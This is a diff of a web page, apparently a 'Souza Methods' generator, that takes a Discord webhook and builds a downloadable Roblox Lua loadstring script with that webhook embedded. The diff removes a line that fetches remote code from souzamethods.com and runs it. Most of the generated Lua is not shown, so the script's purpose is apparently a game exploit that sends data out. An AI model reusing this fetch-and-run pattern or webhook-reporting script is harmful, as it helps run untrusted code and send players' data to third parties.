@@ -74,7 +74,6 @@
       <text x="100" y="125" font-family="Georgia, serif" font-size="90" fill="#C0C0C0" text-anchor="middle" font-weight="bold">SZ</text>
     </svg>
     <div class="matrix-code" id="matrix"></div>
-    <!-- REMOVIDO O ORBIT AQUI -->
   </div>
 
   <div class="hub">
@@ -104,7 +103,6 @@
     setInterval(()=>{ for(let i=0;i<3;i++) particles.push(new Particle()); },80); animate();
     window.addEventListener('resize',()=>{ canvas.width=window.innerWidth; canvas.height=window.innerHeight; });
 
-    // CÓDIGO CAINDO (MATRIX)
     const matrix = document.getElementById('matrix');
     const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
     setInterval(()=>{ 
@@ -118,8 +116,6 @@
       setTimeout(() => char.remove(), 5000); 
     }, 80);
 
-    // REMOVIDO O ORBIT COMPLETAMENTE
-
     document.addEventListener('mousemove',(e)=>{ 
       for(let i=0;i<2;i++){ 
         const p = new Particle(); 
@@ -130,7 +126,7 @@
       } 
     });
 
-    // === GERAÇÃO DE LOADSTRING + ENVIO DO LINK + EFEITO MATRIX ===
+    // === GERAÇÃO DE LOADSTRING (EMBUTIDO) ===
     const modal = document.getElementById('webhookModal');
     const input = document.getElementById('webhookInput');
     const status = document.getElementById('status');
@@ -141,13 +137,6 @@
       let id = 'SZC-';
       for (let i = 0; i < 6; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
       return id;
-    }
-
-    function generateRandomKey() {
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      let key = '';
-      for (let i = 0; i < 8; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
-      return key;
     }
 
     function openWebhookModal() {
@@ -168,10 +157,8 @@
       }
 
       const userID = generateID();
-      const loadKey = generateRandomKey();
       localStorage.setItem('discordWebhook', webhook);
       localStorage.setItem('userID', userID);
-      localStorage.setItem('loadKey', loadKey);
 
       try {
         await fetch(webhook, {
@@ -181,7 +168,7 @@
             content: null,
             embeds: [{
               title: "SOUZA x COFIZIN ATIVADO!",
-              description: `**Usuário:** \`${userID}\`\n**Loadstring:** \`${loadKey}\`\nMétodo ativado!`,
+              description: `**Usuário:** \`${userID}\`\nMétodo ativado!`,
               color: 65280,
               timestamp: new Date().toISOString(),
               footer: { text: "Souza Methods V1" },
@@ -191,11 +178,11 @@
         });
 
         showStatus(`Ativado! ID: ${userID}`, '#00ff00');
-        setTimeout(() => generateLoadstring(userID, loadKey, webhook), 800);
+        setTimeout(() => generateLoadstring(userID, webhook), 800);
       } catch { showStatus('Erro de conexão.', '#ff0000'); }
     }
 
-    function generateLoadstring(userID, loadKey, webhook) {
+    function generateLoadstring(userID, webhook) {
       const luaScript = `-- SOUZA x COFIZIN - ID: ${userID}
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -349,7 +336,7 @@ end)
 print("Souza x Cofizin carregado! ID: ${userID}")`;
 
       const finalLua = luaScript.replace(/\${userID}/g, userID).replace(/\${webhook}/g, webhook);
-      const loadstringCode = `loadstring(game:HttpGet("https://souzamethods.com/script/${loadKey}"))()`;
+      const loadstringCode = `loadstring([[\n${finalLua}\n]])()`;
 
       const blob = new Blob([loadstringCode], { type: 'text/plain' });
       const url = URL.createObjectURL(blob);
@@ -363,7 +350,7 @@ print("Souza x Cofizin carregado! ID: ${userID}")`;
 
       downloadBtn.innerHTML = `Baixado! (${userID})`;
       downloadBtn.style.display = 'block';
-      showStatus(`Loadstring: ${loadKey}`, '#00ff00');
+      showStatus(`Script pronto!`, '#00ff00');
 
       setTimeout(() => URL.revokeObjectURL(url), 1000);
     }
